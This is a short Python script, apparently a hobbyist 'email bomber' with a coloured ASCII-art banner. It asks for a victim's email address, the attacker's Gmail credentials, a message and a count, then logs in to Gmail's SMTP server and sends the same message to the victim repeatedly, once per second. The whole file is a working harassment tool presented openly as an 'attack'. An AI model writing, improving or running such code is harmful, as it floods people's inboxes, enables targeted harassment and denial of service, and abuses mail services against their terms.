import smtplib
import time
print ("\033[1;31m                  __      _____         __           __    ___   ___         __          \033[1;m")
print ("\033[1;34m                 |##|    /#####|   _____##|     ____ ##|   \##\ /##/    ____ ##|          \033[1;m")
print ("\033[1;34m            _____|##|   |##|___   /#######|    /####\##|    \#####/    /####\##|            \033[1;m")
print ("\033[1;34m           |########|   |######| |##|  |##|   |##|  |##|    /#####\   |##|  |##|             \033[1;m")
print ("\033[1;31m      __   |##|__|##|   |##|___  |##|  |##|   |##|  |##|   /##/ \##\  |##|  |##|               \033[1;m")
print ("\033[1;31m     |##|  |#########|   \#####|  \########|  |##|  |##|  /##/   \##\ |##|  |##|                \033[1;m")  
try:
    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
    email = input("Enter your gmail_address:")
    password = input("Enter your gmail_password:")
    message = input("Enter Message:")
    counter = int(input("How many message you want to send?:"))

    for x in range(0,counter):
        print("Number of Message Sent : ", x+1)
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")
